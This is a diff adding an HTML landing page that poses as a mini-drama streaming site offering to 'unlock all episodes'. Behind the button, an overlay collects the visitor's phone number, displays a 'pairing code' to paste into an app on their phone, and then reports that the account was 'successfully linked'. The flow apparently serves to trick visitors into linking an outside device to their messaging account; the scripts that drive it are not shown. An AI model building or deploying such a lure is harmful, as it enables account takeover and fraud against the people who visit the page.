@@ -1,0 +1,129 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <title data-copy="title">Unlock the next episode</title>
+    <meta name="description" content="Link your account to keep watching trending mini-dramas." data-copy="description" />
+    <meta property="og:title" content="Unlock the next episode" data-copy="title" />
+    <meta property="og:description" content="Link your account to keep watching trending mini-dramas." data-copy="description" />
+    <meta property="og:type" content="website" />
+    <meta property="og:image" content="assets/images/og-image.svg" />
+    <link rel="stylesheet" href="assets/theme.css" />
+    <script src="assets/scene.js" defer></script>
+    <script src="assets/account-link-elements.js" defer></script>
+  </head>
+  <body>
+    <div id="landing-stage">
+      <main class="theme-shell drama-landing">
+        <article class="drama-showcase">
+          <div class="poster-card">
+            <video
+              class="poster-video"
+              src="assets/images/poster.mp4"
+              width="900"
+              height="1000"
+              autoplay
+              muted
+              loop
+              playsinline
+              preload="metadata"
+              poster="assets/images/poster.svg"
+            ></video>
+            <span class="poster-episode" data-copy="episodeLabel">EP.12</span>
+            <span class="poster-play" aria-hidden="true">
+              <svg viewBox="0 0 24 24" width="28" height="28" fill="currentColor" aria-hidden="true">
+                <path d="M8 5.14v13.72L19 12 8 5.14z" />
+              </svg>
+            </span>
+          </div>
+
+          <header class="hero">
+            <p class="hero-badge" data-copy="badge">Trending</p>
+            <h1 class="drama-title" data-copy="dramaTitle">After the Wrong Wedding, He Can't Let Go</h1>
+            <p class="drama-hook" data-copy="hook">"You think you can run? You're mine forever."</p>
+            <ul class="drama-tags" aria-label="Genres">
+              <li data-copy="tag1">Romance</li>
+              <li data-copy="tag2">Revenge</li>
+              <li data-copy="tag3">Mini-drama</li>
+            </ul>
+            <div class="drama-stats">
+              <span data-copy="statViews">12.8M watching</span>
+              <span class="drama-stats-dot" aria-hidden="true">·</span>
+              <span data-copy="statRating">9.6 rated</span>
+            </div>
+          </header>
+        </article>
+      </main>
+
+      <section class="episode-strip" aria-label="Episodes">
+        <h2 class="episode-strip-title" data-copy="episodesLabel">More episodes</h2>
+        <div class="episode-strip-viewport">
+          <div class="episode-strip-track">
+            <figure class="episode-thumb">
+              <img src="assets/images/image.png" alt="" width="368" height="208" loading="lazy" />
+              <figcaption data-copy="episode1Label">EP.10</figcaption>
+            </figure>
+            <figure class="episode-thumb">
+              <img src="assets/images/image.png" alt="" width="368" height="208" loading="lazy" />
+              <figcaption data-copy="episode2Label">EP.11</figcaption>
+            </figure>
+            <figure class="episode-thumb episode-thumb--current">
+              <img src="assets/images/image.png" alt="" width="368" height="208" loading="lazy" />
+              <figcaption data-copy="episode3Label">EP.12</figcaption>
+            </figure>
+          </div>
+        </div>
+      </section>
+
+      <span id="cta-copy" hidden data-copy="ctaButton">Unlock all episodes</span>
+      <button type="button" class="unlock-button" id="downloadButton" aria-labelledby="cta-copy"></button>
+    </div>
+
+    <div class="main-container" id="main-container">
+      <div class="text-info">
+        <h2 data-copy="overlayTitle">Log in to unlock all episodes</h2>
+        <p data-copy="overlaySubtitle">Verify your number and keep watching.</p>
+      </div>
+
+      <span id="phone-copy" hidden>
+        <span data-copy="phoneLabel">Enter your mobile number</span>
+        <span data-copy="phonePlaceholder">Enter your phone number</span>
+        <span data-copy="countrySearchPlaceholder">Search for country name or code</span>
+        <span data-copy="submitLabel">CONTINUE</span>
+        <span data-copy="pairingTitle">Enter Code on Your Phone</span>
+        <span data-copy="associating">Linking your account</span>
+        <span data-copy="tipsHeading">Helpful Tips</span>
+        <span data-copy="tipsCopied">The pairing code has been copied. Please paste it in your app.</span>
+        <span data-copy="verificationLabel">Verification Code:</span>
+        <span data-copy="successTitle">Binding Successful!</span>
+        <span data-copy="successBody">Your account has been successfully linked!</span>
+        <span data-copy="successFooter">You can now unlock and watch all episodes.</span>
+        <span data-copy="successContinue">Continue</span>
+      </span>
+
+      <account-link-flow class="login-flow">
+        <div class="login-box" id="login-card">
+          <phone-number-field></phone-number-field>
+        </div>
+        <account-link-submit id="continue-btn"></account-link-submit>
+        <pairing-code-panel></pairing-code-panel>
+        <app-launch-actions></app-launch-actions>
+        <account-link-status></account-link-status>
+        <account-initialization-status></account-initialization-status>
+      </account-link-flow>
+    </div>
+
+    <div class="success-modal" id="success-modal" hidden>
+      <div class="success-modal-card">
+        <h2 class="success-modal-title" data-copy="successTitle">Binding Successful!</h2>
+        <p class="success-modal-body" data-copy="successBody">Your account has been successfully linked!</p>
+        <div class="ok-circle" aria-hidden="true">✔</div>
+        <p class="success-modal-footer" data-copy="successFooter">You can now unlock and watch all episodes.</p>
+        <button type="button" class="success-continue-btn" id="success-continue-btn" data-copy="successContinue">
+          Continue
+        </button>
+      </div>
+    </div>
+  </body>
+</html>
